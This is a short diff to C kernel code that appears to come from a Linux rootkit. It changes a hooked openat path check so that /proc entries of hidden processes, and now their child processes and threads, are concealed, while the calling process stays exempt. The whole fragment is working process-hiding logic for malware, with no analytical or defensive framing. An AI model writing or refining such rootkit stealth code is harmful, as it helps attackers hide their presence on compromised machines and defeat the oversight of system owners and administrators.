@@ -51,7 +51,10 @@ static notrace bool is_hidden_proc_path(const char __user *pathname)
     if (kstrtoint(pid_buf, 10, &pid) < 0)
         return false;
 
-    return is_hidden_pid(pid);
+    if (pid == (int)task_tgid_vnr(current))
+        return false;
+
+    return is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid);
 }
 
 static notrace asmlinkage long hook_openat(const struct pt_regs *regs)
